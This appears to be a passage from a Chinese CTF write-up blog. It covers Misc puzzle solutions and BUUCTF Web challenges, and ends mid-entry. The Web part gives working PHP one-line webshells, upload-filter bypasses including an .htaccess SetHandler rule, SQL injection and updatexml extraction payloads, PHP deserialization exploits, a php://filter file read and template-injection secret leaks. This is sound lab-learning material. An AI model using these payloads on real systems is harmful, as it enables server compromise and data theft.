为2 30、[VNCTF2022公开赛]仔细找找取出杂色点即可 12345import sysfrom PIL import Imageimg=Image.open(&quot;flag.png&quot;)img = img.resize((79, 71), Image.NEAREST)img.save(&quot;flag2.png&quot;) 得到flag 1vnctf&#123;34aE@w&#125; 31、[Dest0g3 520迎新赛]OCR宽高修复之后 得到图片文件 图片上都是十六进制 保存为7z文件后 1377ABCAF271C000451FCF397500200000000000062000000000000001D9C97C8E004D002485D0022194A676D2FDE351A055c168F9710364AE2D581126E378F3B4c47E15E2E80B74234B849430A221F40C086E06B24ADAAC47F32CB62CADD154B50723E65E50CDF99CC2B953916AD2204D70C15FB493BD4C2E1F93902FB3563190ACEE58CC01621BB2AAAB6EED8CE892FEF5F0927E2C4BCD7C188277D09D0357995A2FB65D31CD99c853D7BAF52EAD8555920D1672B4A3B713917E98FB324AD225A3FA2AFAC1435FFE31ED0C0CEF0CA0B68C0CCCA81C458680D7C75139429D282984933F7ACFDFB127321D9F4EFC0FEAAE92F985D3C457E90AFBC4DA9D11B23E507A0953036A2EC1D75D69CD1F6A9F0790B1AB02D6C2AFFDF66A2E7E56A1070FBCD316813E12DF9E26FC4813D419792A65960D4D97EDFA7A978A0385C04CF36EFDE3B07DF9B9405253EAA838149910F2571FAA4A8E085D1567C5C17C9B3400F91FBFE6B47E052BA07097C9D77803D3A45E3477FE324603179C7CA6A128CDC0F7E834812618AD4C79934226637E9300C5595E355139A2ECF661A5F63750A6A0035ACF52417AF3A1C1FEA14471D074c27F81c719D98717F4ECD32918BD15C18AB93769E94DDEFD3B6FAF4DDD6628BA44BDEF574FCCD5589334EA8063D7B27A2F0600FC864D010A7F0CEC9B9395434878D01943887194342F9D34FC8F12DD4556ED5A5A36667F9319A0395DB9A445B94C44771B406F962B1CFC8535BA0D3EE3DDDEB876C95092AAB192B168A732F3A7B9E8156c403c583983F5527A0D6c5D6928481D56955474046D9FC17A2DE21F3D6FC4c69644E7c6A141BE948A417A33D62C6FF6DFAC702A0FC101748D9A9C64A6A0000010406000109825000070B010001212101000C84D100080A0196EAFE6000000501190A0000000000000000000011190044006500730074003000670033002E00740078007400000019020000140A0100B547E05F6654D8011506010020000000000000 得到一串base64加密后的字符串 1RGVzdDBnM3szNDUxMjA5OC0zMzA5LTc3MTItODg2NS03ODM0NjAyMjE2NDd9 解码后即可得到flag 32、[NewStarCTF 2023 公开赛道]滴滴滴解压后得到两个文件一个是音频文件另一个是一张图片对音频文件 1dtfm2num 1.wav 得到dtfm数字 152563319066 再使用steghide对图片进行解密即可 1steghide extract -sf secret.jpg -p 52563319066 33、[NewStarCTF 2023 公开赛道]阳光开朗大男孩flag.txt文件中是一大堆表情需要使用emoji-aes进行解密但是emoji-aes解密还需要key 那么key就在secret.txt文件当中显然是社会主义核心价值观解密 得到key 1this_password_is_s000_h4rd_p4sssw0rdddd key为 1s000_h4rd_p4sssw0rdddd 经过emoji-aes decrypt后 即可得到flag 34、[NewStarCTF 公开赛赛道]奇怪的PDF发现缺少文件头 补全即可 125 50 44 46 使用wbstego进行解密即可 无密码 得到flag 1flag&#123;PDF_1s_n0t_strang3&#125; 35、[BJDCTF 2nd]Real_EasyBaBa使用010editor打开 在右侧的小框中 发现了字符画 得到flag 1BJD&#123;572154976&#125; 36、[DASCTF X CBCTF 2023｜无畏者先行]justlisten二维码一眼汉信码 解码之后得到的内容为 10urS3cret 则利用oursecret工具 对bmp文件进行处理 密码就是0urS3cret得到字符串 10urS3cret 打开音频, 留意到这个37.8秒的音频中, 每0.1秒都会有一个固定频率。 因此思路是先分成378段, 然后统计频率数量。 这里简单讲讲我的粗糙实现方法：先是读入数据, 然后每4410分一段, 然后考虑到直接做傅里叶变换可能不会出来一些稀疏系数(也就是可能不能直接看出来具体的精准频率)。所以我做的方法是, 对每个序列的第二个值(第一个值全部为0)进行统计, (复制到excel中, 然后去除重复值)发现一共只有10种不同的值。因此可以推断只有10种频率, 直接就把378行映射成378个值。按照从小到大的顺序对这10个频率分别编码成0-9 提取出数字序列如下 1090003090700030910000310000710030710002207031005192203203432284426284735274836292742424842463147282734424837362942334607200806240618111002131804010009201403081110001813210014112205130210200100062118140837333628131003010921082018040805110700221310210109100321110418100005131000221514051415000514292644284531644807521819110813066219616228141321042462081305141712001952141367676763 留意到378&#x3D;189*2, 后面的统计也发现, 如果两位为一个数, 则没有超过68的数字, 猜测每两位组成字母表对应的一个位置。 尝试解密, 得到如下结果 1jadjhadjkadkahkdhkawhdkftwduIGCSACVJBWKDBQQWQUFVCBIQWLKDQHUhuigygslkcnsebajuodilkasnvaolwfnckubagvsoiLHKCnkdbjviuseiflhawnkvbjkdvleskafnkawpofopafoDASCTF&#123;Wh1stling_t0_Convey_informat1on!!!&#125; 37、[DASCTF Oct X 吉林工师 欢迎来到魔法世界～]giveyourflag压缩包嵌套重复解压缩即可python脚本如下 切记要单独放在一个文件夹里 在桌面解压直接给我干报废了 1234567891011import zipfilef = zipfile.ZipFile(&quot;flag1&quot;, &#x27;r&#x27;)while 1: try: name = f.namelist()[0] print(name) f.extractall() f = zipfile.ZipFile(name, &#x27;r&#x27;) except: break 然后会得到一串base64 1R0RWRldJezdnZ3FnbGwzanl1a2RuY3N0aTlpY3BjM2ZlYjB2NW9wfQ== 解码后得到 1GDVFWI&#123;7ggqgll3jyukdncsti9icpc3feb0v5op&#125; 初具雏形 但是前面的flag标志不太正确 按理来说应该是DASCTF凯撒密码解码 在cyberchef中选择 ROT13参数 不勾选Rotate numbers 设置为-3 即可得到flag 1DASCTF&#123;7ddndii3gvrhakzpqf9fzmz3cby0s5lm&#125; 38、[NewStarCTF 公开赛赛道]最后的流量分析sqli.pcap 则猜想应该是和sql注入相关的按包的长度进行排序 发现长度在768及以上的为注入成功的流量包 或者直接搜索flag也可以发现接着使用tshark进行解密即可 注意要在linux系统下运行 1tshark -r sqli.pcap -T fields -Y &quot;http.request.method==GET or frame.len&gt;765&quot; -e &quot;frame.len&quot; -e &quot;http.request.uri.query.parameter&quot; &gt; data.txt 然后对导出的data.txt文件 使用python进行处理 导出处理结果 12345678910from urllib.parse import *import recomment = &#x27;&#x27;with open(&#x27;data.txt&#x27;) as f: lines = f.readlines() for i in range(len(lines)): if int(lines[i][:3])&gt;765: comment += re.findall(r&#x27;&quot;(.)&quot;&#x27;, unquote(lines[i-1]))[0]print(comment) 即可获得flag 39、[NewStarCTF 公开赛赛道]Look my eyes由题目简介中 1请看着我沉默的眼睛 则silenteye解码之后得到 1ZmxhZ3tMMG9rX20zXzFuX215X2V5M3N9 直接cyberchef base64 获得flag 1flag&#123;L0ok_m3_1n_my_ey3s&#125; 40、[Dest0g3 520迎新赛]StrangeTraffic导出tcp流 从服务器分组获取一串密文 同一个首字母的我们只复制最后一组 1R.G.V.z.d.D.B.n.M.3s.z.M.U.E.1.Q.k.V.BN.i.1.G.M.j.B.E.L.UY.x.O.E.E.t.R.T.h.FQ.S.0.y.O.U.I.0.R.jI.1.N.z.E.w.O.E.J.9A.B.C.D.E.F.G.H.I.J 经过python处理 1RGVzdDBnM3szMUE1QkVBNi1GMjBELUYxOEEtRThFQS0yOUI0RjI1NzEwOEJ9ABCDEFGHIJ 然后直接base64 即可得到flag 1Dest0g3&#123;31A5BEA6-F20D-F18A-E8EA-29B4F257108B&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"http://xxxkkk578.github.io/categories/CTF/"}],"tags":[{"name":"CTF,Misc","slug":"CTF-Misc","permalink":"http://xxxkkk578.github.io/tags/CTF-Misc/"}]},{"title":"BUUCTF篇-Web部分题解","slug":"buu_web","date":"2024-04-09T15:09:33.000Z","updated":"2024-04-10T11:15:36.057Z","comments":true,"path":"2024/04/09/buu_web/","permalink":"http://xxxkkk578.github.io/2024/04/09/buu_web/","excerpt":"","text":"BUUCTF篇Web1、 [极客大挑战 2019]Upload1一句话 上传shell.php文件 文件内容为 则连接密码为123 1&lt;?php @eval($_POST[&#x27;123&#x27;])?&gt; 1GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[123])&lt;/script&gt; 页面返还 1Not image! 使用burp抓包修改文件类型即可 修改内容为 1Content-type:image/jpg 页面返还 1not php！ 则说明后缀为php是不行的 因此需要其他后缀进行绕过 1phtml、pht、php、php3、php4、php5 上传成功 之后需要点击该文件才能产生连接 需要访问upload目录 再用蚁剑或菜刀连接即可 2、 [ACTF2020 新生赛]Upload首先上穿最基本的一句话php 并且直接用phtml作为文件后缀 1该文件不允许上传，请上传jpg、png、gif结尾的图片噢！ 则类似上题 burp抓包后修改文件类型 12嘿伙计，你发现它了！ 未选择任何文件 Upload Success! Look here~ ./uplo4d/17a92c8d532f506204d798bc569ce42e.phtml 直接搞定了 最后还是蚁剑连一下 找flag 一般都在根目录 3、[极客大挑战 2019]BabySQL进去后是典型的输入用户名和密码的登录框 按如下方法进行测试 即不断更改单引号的位置 然后观察报错的内容 如在password中输入admin’ 后 页面返回报错内容为 其中admin最外层的两个单引号是报错给的 1for the right syntax to use near &#x27;&#x27;admin &#x27;&#x27;&#x27; 因此可以通过在password框中输入如下代码来进行测试 1admin&#x27; 语句 # 经测试 发现or, select,where, union 均被过滤 应该是被replace函数替代成为了空字符 因 因此采用联合查询的方式 1admin&#x27; uunionnion sselectelect 1,2%23 # 报错 加一列试试 1admin &#x27; uunionnion sselectelect 1,2,3%23 # 返回的页面为 12Hello ‘2’Your password is &#x27;3’ 因此注入的代码中 2，3两个位置可以用来显示 继续查表 1234admin&#x27; uunionnion sselectelect 1,2,group_concat(table_name)ffromrom infoorrmation_schema.tableswwherehere table_schema=database() # 1wwherehere table_schema=database() 加上则代表查询到的是用户自定义的表 返回的页面为 12Hello ‘2’Your password is &#x27;b4bsql,geekuser’ 知道了表名之后继续查询列相关的信息 12admin&#x27; UNunionION SEselectLECT 1,2,GROUP_CONCAT(column_name) FfromROM infoorrmation_schema.columns WHwhereERE table_name = &#x27;b4bsql&#x27;# 查询结果 12第一行都一样 不写了Your password is &#x27;id,username,password 查询另一个表 12admin&#x27; UNunionION SEselectLECT 1,2,GROUP_CONCAT(column_name) FfromROM infoorrmation_schema.columns WHwhereERE table_name = &#x27;geekuser&#x27;# 查询结果同上 接下来直接爆数据即可 1admin &#x27; UNunionION SEselectLECT 1,2,GROUP_CONCAT(passwoorrd) frfromom b4bsql # 4、 [极客大挑战 2019]PHP1因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯 和备份相关的 则扫描根目录 1python dirsearch.py -u https://target 里面有个flag.php 但是是唬人的 打开index.php 发现了和序列化相关的内容 12345&lt;?php include &#x27;class.php&#x27;; $select = $_GET[&#x27;select&#x27;]; $res=unserialize(@$select); ?&gt; 打开class.php源码看看 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpinclude &#x27;flag.php&#x27;;error_reporting(0);class Name&#123; private $username = &#x27;nonono&#x27;; private $password = &#x27;yesyes&#x27;; public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; function __wakeup()&#123; $this-&gt;username = &#x27;guest&#x27;; &#125; function __destruct()&#123; if ($this-&gt;password != 100) &#123; echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); &#125; if ($this-&gt;username === &#x27;admin&#x27;) &#123; global $flag; echo $flag; &#125;else&#123; echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;; die(); &#125; &#125;&#125;?&gt; 分析如下 顺序执行 在__wakeup函数中 username变为guest 要想阻止它就要跳过这个函数 在__destruct函数中 password必须等于100 否在在第一个分支中die就结束了 同时username必须等于admin 脚本 123456789101112131415&lt;?phpclass Name&#123; private $username = &#x27;nonono&#x27;; private $password = &#x27;yesyes&#x27;; public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125;&#125;$a = new Name(&#x27;admin&#x27;, 100);var_dump(serialize($a));?&gt; 运行脚本之后得到的结果 1、在线php即可运行 2、或者直接在php目录下运行亦可 1O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125; 前文提到过 需要跳过__wakeup函数 来保证username为admin而不是guest 则修改为将2修改为3之后 意为有3个参数 而__wakeup函数只接受两个参数 故可实现跳过 1O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125; 又因为username和password 是private定义的 此私有字段的字段名在序列化时前面会加上0的前缀 即%00 故最终的操作为 1O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125; 构造反序列化 1/?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125; 复制到网址后面即可 5、[ACTF2020 新生赛]BackupFile经扫描目录后发现 12[09:48:36] 200 - 0B - /flag.php[09:49:30] 200 - 347B - /index.php.bak 1index.php.bak 打开该文件后 查看到源代码 1234567891011121314151617&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET[&#x27;key&#x27;])) &#123; $key = $_GET[&#x27;key&#x27;]; if(!is_numeric($key)) &#123; exit(&quot;Just num!&quot;); &#125; $key = intval($key); $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;; if($key == $str) &#123; echo $flag; &#125;&#125;else &#123; echo &quot;Try to find out source file!&quot;;&#125; 首先key只能是数字 其次比较的是key的十进制大小 在php中 两个等号&#x3D;&#x3D; 代表弱比较 弱比较：等长的两个字符串 全部变为整数 如果含有字母 则值为0 再进行比较是否相等 因此在这个情况下只需要传入 在index.php下 或者直接在起始目录下均可 1?key=123 6、[RoarCTF 2019]Easy CalcF12检查源代码发现 calc.php 123456789101112131415$(&#x27;#calc&#x27;).submit(function()&#123; $.ajax(&#123; url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()), type:&#x27;GET&#x27;, success:function(data)&#123; $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt; &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125; &lt;/div&gt;`); &#125;, error:function()&#123; alert(&quot;这啥?算不来!&quot;); &#125; &#125;) return false;&#125;) 点进calc.php之后发现 123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET[&#x27;num&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET[&#x27;num&#x27;]; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123; die(&quot;what are you want to do?&quot;); &#125; &#125; eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);&#125;?&gt; 传入num&#x3D;1之后 可以回显 但是传入num&#x3D;a之后 不能回显 并且由blacklist可知 设置了屏蔽 则最后的payload中字符应该使用chr()函数进行绕过 chr里的数字为ascii值 解决方法 在num前添加一个空格 php在读取的时候会默认删除这个空格 而waf又会因为空格检测不到num这个参数 标准的列出文件目录 1? num=var_dump(scandir(/)) 使用chr 1? num=var_dump(scandir(chr(47))) 获取到 1&quot;f1agg&quot; 则 1? num=file_get_contents(/f1agg) 即 1? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)) 7、[极客大挑战 2019]BuyFlag本题的关键是绕过 1is_numeric 方法 123%00%20 即空格放在数值后面 在改用POST方法之后 在请求头中添加了如下内容 1password=404%20&amp;money=100000000 返回了 123you are CuiterPassword Right!Nember lenth is too long 即数字长度太长 考虑科学计数法进行绕过 1money=1e8 绕过失败 1you have not enough money 那就 1money=1e9 成功 还有一种是根据strcmp函数特性进行绕过的方式 1moneyp[]=100000000 8、 [BJDCTF2020]Easy MD5只有一个框 不知道是干什么用的 抓包后 在request里什么也没找到 但是在response里面找到了 1Hint: select * from &#x27;admin&#x27; where password=md5($pass,true) 看到这个就要想起常用的绕过md5的方式 1ffifdyop 传参后 进入下一个页面 1234567&lt;!--$a = $GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];if($a != $b &amp;&amp; md5($a) == md5($b))&#123; // wow, glzjin wants a girl friend.--&gt; 则寻求md5的一组碰撞 或 利用php数组进行绕过 因为哈希函数无法处理数组 故md5函数返回的值一定是false 而false等于false一定成立 1?a[]=1&amp;b[]=2 来到下一个页面 123456789&lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123; echo $flag;&#125; 注意这里的方法是post 因此不能单纯的在url后加上？param1[]&#x3D; 因此使用burp抓包 改为post方法后得到flag 9、 [HCTF 2018]admin查看源代码 发现 1&lt;!-- you are not admin --&gt; 得知 账户需要为admin才可以触发某些东西 尝试输入admin账户 结果密码123直接爆了 1flag&#123;c667ed32-7557-4530-b11c-40031e8dba73&#125; 加入没爆呢 我们按正常的流程来写一写 大致扫一遍每个页面的源代码页 发现密码修改页面出现了github源码泄露 https://github.com/woadsl1234/hctf_flask/ https://github.com/woadsl1234/hctf_flask/ 结果直接找不到该项目 在网上找了找接下来的流程 利用flask进行session伪造 或者利用unicode欺骗 10、[MRCTF2020]你传你🐎呢试了一下 简单的上传并不可以 尝试使用.htaccess方法 在.htaccess文件中写入以下内容 使该目录下带有nene的文件被当成php文件执行 123&lt;FilesMatch &quot;nene&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 在上传的过程中记得修改类型 回显 12Warning: mkdir(): File exists in /var/www/html/upload.php on line 23/var/www/html/upload/5666afe9f19a4b6badfdbbd320593274/.htaccess succesfully uploaded! 则 上传成功 再上传nene.png 当然文件内容为一句话木马 上传成功后则连接webshell即可在根目录下找到flag 11、[护网杯 2018]easy_tornado打开页面后发现三个链接 flag 12/flag.txtflag in /fllllllllllllag welcome 12/welcome.txtrender hints 12/hints.txtmd5(cookie_secret+md5(filename)) 则解此题需要知道md5(&#x2F;fllllllllllllag)的值 这个不难 还要知道cookie_secret的值 render提示我们存在模板注入 则尝试以下方式 1error?msg=&#123;&#123;nene&#125;&#125; 页面回显nene 则的确存在模板注入 若想查看cookie_secret 只需要利用模板注入爆出handler.settings即可 则payload为 1error?msg=&#123;&#123;handler.settings&#125;&#125; 则获取到如下信息 12&#123;&#x27;autoreload&#x27;: True, &#x27;compiled_template_cache&#x27;: False, &#x27;cookie_secret&#x27;: &#x27;cd020bca-8f03-4346-aca0-3411a64d4a96&#x27;&#125; 那么就获得了cookie_secret payload如下 1234567import hashlibcookie=&#x27;cd020bca-8f03-4346-aca0-3411a64d4a96&#x27;file_filename=&#x27;/fllllllllllllag&#x27;md5_filename=hashlib.md5(file_filename.encode(encoding=&#x27;UTF-8&#x27;)).hexdigest()word=cookie+md5_filenameflag=hashlib.md5(word.encode(encoding=&#x27;UTF-8&#x27;)).hexdigest()print(flag) 然后拼接一下网址即可 1file?filename=/fllllllllllllag&amp;filehash=0cb78594c1a115a6df1ea1f0a3a359e2 12、[ZJCTF 2019]NiZhuanSiWei进去看到几行代码 12345678910111213141516171819&lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 从上往下依次看 第一个判断 1if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf“) file_get_contents函数从文件中读取内容 这里我们可以用php伪协议中的data:&#x2F;&#x2F;协议来绕过 payload如下 注意是get方法提交参数 因此可以直接在url后面加上?text&#x3D;来测试 1?text=data://text/plain,welcome to the zjctf 绕过成功 接下来是关于flag.php的正则匹配 观察到 1include($file); //useless.php 如果想要查看useless.php的源码 我们可以使用php伪协议的php:&#x2F;&#x2F;flter协议来查看我们使用第二个payload查看该页面的源码 用&amp;&amp;连接 在第一个后面 同时提交这两个参数 1file=php://filter/read=convert.base64-encode/resource=useless.php 1?text=data://text/plain,welcome to the zjctf&amp;&amp;file=php://filter/read=convert.base64-encode/resource=useless.php 得到useless页面的内容 12345678910111213&lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; ?&gt; 从这段代码我们可以看到 Flag会输出flag.php页面的内容 因此我们尝试编写反序列化脚本 123456789101112131415&lt;?php class Flag&#123; //flag.php public $file=&quot;flag.php&quot;; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; $password=new Flag();echo serialize($password);?&gt; 使用php在线工具运行以上脚本得到 1O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 然后在把三段payload都用&amp;连在一起 因为页面要同时GET这三个参数 1?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 进入界面 1234567# welcome to the zjctfoh u find it U R SO CLOSE !///COME ON PLZ 既然已经找到 我们查看页面源代码 得到flag 1flag&#123;19510b2e-c5ec-4d58-8ac3-45f405715b64&#125; 13、 [极客大挑战 2019]HardSQL尝试使用万能密码 无果 11&#x27; or 1=1 # 则尝试使用fuzz获取可以使用的关键词 使用burpsuite抓包 用inturder fuzz一下 知道了具体哪些可以使用 哪些不可以使用 &#x3D;不可使用 但是like可以使用 可以将万能密码修改为 因为((a)like(b))等价于a&#x3D;b 11&#x27;or((1)like(1))# 成功登录 发现1%201不可使用 那么过滤了空格 想到报错注入 报错注入有两种函数可以选择updatexml()函数和extractvalue()函数 这里尝试使用updatexml函数 爆出数据库 11&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))# 获取到库名为geek 查表 11&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))# 获取表名为H4rDsq1 查字段 11&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))# 获取字段名为’id,username,password‘ 查找字段内容 11&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(username,&#x27;~&#x27;,password))from(H4rDsq1)),0x7e),1))# 获取部分 ‘flagflag{0f70795b-4266-461e-96’ 使用right突破限制 11&#x27;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))# 获取剩余部分’6-461e-96d7-e1a4c490a2c0}‘ 14、[MRCTF2020]Ez_bypass打开给出的页面 12345678910111213141516171819202122232425262728293031323334353637383940I put something in F12 for youinclude &#x27;flag.php&#x27;;$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123; $id=$_GET[&#x27;id&#x27;]; $gg=$_GET[&#x27;gg&#x27;]; if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123; echo &#x27;You got the first step&#x27;; if(isset($_POST[&#x27;passwd&#x27;])) &#123; $passwd=$_POST[&#x27;passwd&#x27;]; if (!is_numeric($passwd)) &#123; if($passwd==1234567) &#123; echo &#x27;Good Job!&#x27;; highlight_file(&#x27;flag.php&#x27;); die(&#x27;By Retr_0&#x27;); &#125; else &#123; echo &quot;can you think twice??&quot;; &#125; &#125; else&#123; echo &#x27;You can not get it !&#x27;; &#125; &#125; else&#123; die(&#x27;only one way to get the flag&#x27;); &#125;&#125; else &#123; echo &quot;You are not a real hacker!&quot;; &#125;&#125;else&#123; die(&#x27;Please input first&#x27;);&#125;&#125;Please input first 可以看出来第一步是传两个参数 gg和id 要求这两个变量值不相等 但是md5值相等 即找一组md5的碰撞 或者使用数组来绕过 这里使用数组进行绕过因为是get获取参数 因此可以直接在url中传参 1?id[]=1&amp;gg[]=2 回显 1You got the first steponly one way to get the flag 证明到了第二步 要求使用post方法传入passwd参数 不能是数字 但是要和1234567相等 对于php的&#x3D;&#x3D;弱比较 先等长 再比较 则只要1234567a 即可让passwd既不是数字 还能满足弱比较的要求 post传参后得到flag 1flag&#123;75b3015e-b845-4afa-b6da-6199276733d8&#125; 15、[网鼎杯 2020 青龙组]AreUSerialz打开之后是网页的源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; payload如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?phpclass FileHandler &#123; private $op=2; private $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;; private $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; // $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; // $this-&gt;process(); &#125;&#125;$A=new FileHandler();$B=serialize($A);echo $B; 包含内容： php伪协议读取文件 将protected改为private 因为protected权限的变量序列化之后会在字符前增加%00 反序列化 16、[SUCTF 2019]CheckIn文件上传 试试一句话 1&lt;?php @eval($_POST[&#x27;nene&#x27;])?&gt; 回显 1illegal suffix! 提示后缀违法 迅速想到.htaccess方法 然而.htaccess方法是针对apache的 1exif_imagetype:not image! 看来应该是抓包修改文件类型的 报错 1&lt;? in contents! 解决方法：更换payload 12GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[nene])&lt;/script&gt; 123Your dir uploads/f65a0ca982c669865231909b0ec85a0c Your files : array(5) &#123; 